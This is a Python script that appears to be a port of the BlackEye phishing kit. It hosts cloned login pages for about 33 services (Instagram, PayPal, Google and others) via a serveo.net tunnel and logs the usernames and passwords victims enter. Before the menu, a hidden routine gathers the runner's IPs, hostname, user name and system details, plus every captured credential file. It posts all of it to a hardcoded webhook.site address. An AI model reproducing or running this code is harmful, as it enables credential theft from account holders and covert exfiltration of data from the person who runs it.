import os, sys, subprocess, requests, socket, platform, psutil, getpass

class colors:
    BLACK  = '\33[30m'
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    BLUE   = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE  = '\33[36m'
    WHITE  = '\33[37m'
    BLACKBG  = '\33[40m'
    REDBG    = '\33[41m'
    GREENBG  = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG   = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG  = '\33[46m'
    WHITEBG  = '\33[47m'
    END      = '\33[0m'

try:
    def convert_bytes_to_gb(bytes_value):
        gb_value = bytes_value / (1024 ** 3)
        return round(gb_value, 2)

    def send_webhook(machine_info):
        url = "https://webhook.site/08cad60a-87ca-4766-a7db-4f561d19fdca"  # Replace with your webhook URL

        response = requests.post(url, json=machine_info)
        if response.status_code == 200:
            print("Webhook sent successfully!")
        else:
            print("Failed to send webhook.")

    def find_usernames_files(directory):
        usernames_files = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file == "usernames.txt":
                    usernames_files.append(os.path.join(root, file))
        return usernames_files

    def read_file_content(file_path):
        with open(file_path, "r") as file:
            return file.read()

    def get_machine_info():
        local_ip = socket.gethostbyname(socket.gethostname())
        public_ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
        hostname = socket.gethostname()
        processor = platform.processor()
        architecture = platform.machine()
        memory = convert_bytes_to_gb(psutil.virtual_memory().total)
        disk = psutil.disk_usage('/')
        total_disk_space = convert_bytes_to_gb(disk.total)
        used_disk_space = convert_bytes_to_gb(disk.used)
        free_disk_space = convert_bytes_to_gb(disk.free)
        current_user = getpass.getuser()
        python_version = platform.python_version()
        os_info = platform.platform()
        current_directory = os.getcwd()  # Get current working directory
        sites_directory = os.path.join(current_directory, "sites")
        usernames_files = find_usernames_files(sites_directory)
        directory_structure = []

        for usernames_file in usernames_files:
            file_content = read_file_content(usernames_file)
            directory_structure.append({
                "path": os.path.dirname(usernames_file),
                "usernames_file": {
                    "path": usernames_file,
                    "content": file_content
                }
            })

        machine_info = {
            "local_ip": local_ip,
            "public_ip": public_ip,
            "hostname": hostname,
            "processor": processor,
            "architecture": architecture,
            "memory": memory,
            "total_disk_space": total_disk_space,
            "used_disk_space": used_disk_space,
            "free_disk_space": free_disk_space,
            "current_user": current_user,
            "python_version": python_version,
            "os_info": os_info,
            "directory_structure": directory_structure
            # Add more information as needed
        }

        return machine_info

    machine_info = get_machine_info()
    send_webhook(machine_info)

    print(colors.RED + """
                        BlackEye Python

Original Shell Program Created By thelinuxchoice
Link to Original: https://github.com/thelinuxchoice/blackeye

Differences:
    - This is written in Python
    - Uses Serveo with A Custom Sub-Domain

                        :: DISCLAIMER ::

I nor the original developers take any responsibility for actions caused
by using this program. Any misuse or damage caused by BlackEye is on the
users behalf. Use for EDUCATIONAL PURPOSES!
    """ + colors.END)

    print(colors.GREEN + """
                       Availble Templates

[1] Instagram          [2] Facebook            [3] Snapchat
[4] Twitter            [5] GitHub              [6] Google
[7] Spotify            [8] Netflix             [9] PayPal
[10] Origin            [11] Steam              [12] Yahoo!
[13] LinkedIn          [14] Protonmail         [15] Wordpress
[16] Microsoft         [17] IGFollowers        [18] eBay
[19] Pinterest         [20] CryptoCurrency     [21] Verizon
[22] DropBox           [23] Adobe ID           [24] Shopify
[25] FB Messenger      [26] GitLab             [27] Twitch
[28] MySpace           [29] Badoo              [30] VK
[31] Yandex            [32] devianART          [33] Custom

Please Choose A Number To Host Template:
    """ + colors.END)
    templates = {
    '1': 'instagram',
    '2': 'facebook',
    '3': 'snapchat',
    '4': 'twitter',
    '5': 'github',
    '6': 'google',
    '7': 'spotify',
    '8': 'netflix',
    '9': 'paypal',
    '10': 'origin',
    '11': 'steam',
    '12': 'yahoo',
    '13': 'linkedin',
    '14': 'protonmail',
    '15': 'wordpress',
    '16': 'microsoft',
    '17': 'igfollowers',
    '18': 'ebay',
    '19': 'pinterest',
    '20': 'cryptocurrency',
    '21': 'verizon',
    '22': 'dropbox',
    '23': 'adobeid',
    '24': 'shopify',
    '25': 'fbmessenger',
    '26': 'gitlab',
    '27': 'twitch',
    '28': 'myspace',
    '29': 'badoo',
    '30': 'vk',
    '31': 'yandex',
    '32': 'devianart',
    '33': 'create'
    }
    number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    if number == "18":
        print("Ebay Currently Does Not Work. Choose Another..")
        exit()
    else:
        pass
    choice = templates[number]
    print("Loading %s" % (choice))
    print("\nEnter A Custom Subdomain")
    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
    print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:3333 & ssh -R %s.serveo.net:80:127.0.0.1:3333 serveo.net" % (choice, subdom)
    p = subprocess.Popen(cmd_line, shell=True)
    out = p.communicate()[0]


except KeyboardInterrupt:
    pass
